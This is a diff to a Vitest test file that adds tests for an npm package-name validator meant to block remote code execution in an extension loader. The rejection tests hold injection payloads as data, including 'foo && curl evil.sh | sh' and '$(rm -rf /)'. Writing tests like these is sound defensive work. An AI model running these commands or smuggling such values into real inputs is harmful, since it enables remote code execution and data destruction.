@@ -3,7 +3,7 @@
  */
 
 import { describe, it, expect, beforeEach, vi } from 'vitest';
-import { ExtensionLoader } from '../ExtensionLoader';
+import { ExtensionLoader, isValidNpmPackageName } from '../ExtensionLoader';
 import { ExtensionManager } from '../ExtensionManager';
 
 describe('ExtensionLoader', () => {
@@ -110,5 +110,22 @@ describe('ExtensionLoader', () => {
       
       delete process.env.TELEGRAM_BOT_TOKEN;
     });
+  });
+});
+
+describe('isValidNpmPackageName (CR2 — RCE guard)', () => {
+  it('accepts valid scoped + unscoped npm names', () => {
+    expect(isValidNpmPackageName('@framers/agentos-ext-web-search')).toBe(true);
+    expect(isValidNpmPackageName('lodash')).toBe(true);
+    expect(isValidNpmPackageName('@scope/pkg.name-1')).toBe(true);
+  });
+
+  it('rejects names carrying shell metacharacters / injection payloads', () => {
+    expect(isValidNpmPackageName('foo && curl evil.sh | sh')).toBe(false);
+    expect(isValidNpmPackageName('$(rm -rf /)')).toBe(false);
+    expect(isValidNpmPackageName('foo;bar')).toBe(false);
+    expect(isValidNpmPackageName('foo`whoami`')).toBe(false);
+    expect(isValidNpmPackageName('foo\nbar')).toBe(false);
+    expect(isValidNpmPackageName('')).toBe(false);
   });
 });
